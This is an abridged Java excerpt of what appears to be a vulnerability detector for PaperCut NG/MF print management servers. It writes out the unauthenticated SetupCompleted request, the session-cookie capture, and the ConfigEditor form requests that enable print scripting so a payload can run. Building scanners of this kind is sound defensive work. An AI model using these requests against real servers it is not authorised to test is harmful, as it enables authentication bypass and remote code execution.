...
public final class PapercutNGMFVulnDetectorWithPayload implements VulnDetector {
  ...
  @Inject
  PapercutNGMFVulnDetectorWithPayload(@UtcClock Clock utcClock, HttpClient httpClient, PayloadGenerator payloadGenerator) {
  ...
  private void changeSettingForPayload(
    ...
    String settingNav = "service=direct%2F1%2FConfigEditor%2FquickFindForm&sp=S0&Form0=%24TextField%2CdoQuickFind%2Cclear&%24TextField=" + settingName + "&doQuickFind=Go";
    String settingAction = "service=direct%2F1%2FConfigEditor%2F%24Form&sp=S1&Form1=%24TextField%240%2C%24Submit%2C%24Submit%240&%24TextField%240=" + (enable ? "Y" : "N") + "&%24Submit=Update";
  ...
  private boolean isServiceVulnerable(NetworkService networkService) {
    ...
    HttpRequest req = HttpRequest.get(rootUri + "app?service=page/SetupCompleted").setHeaders(basicHeader).build();
    ...
    try {
      ...
      Matcher jsessionIdMatcher = Pattern
              .compile("JSESSIONID=[a-zA-Z0-9.]+;", Pattern.CASE_INSENSITIVE)
              .matcher(setCookiesHeader);

      Matcher bodyContentMatcher = Pattern
      ...
      if (isVulnerable) {
        ...
        HttpHeaders payloadHeaders = HttpHeaders.builder()
        ...
        changeSettingForPayload("print-and-device.script.enable", true, networkService, payloadHeaders);
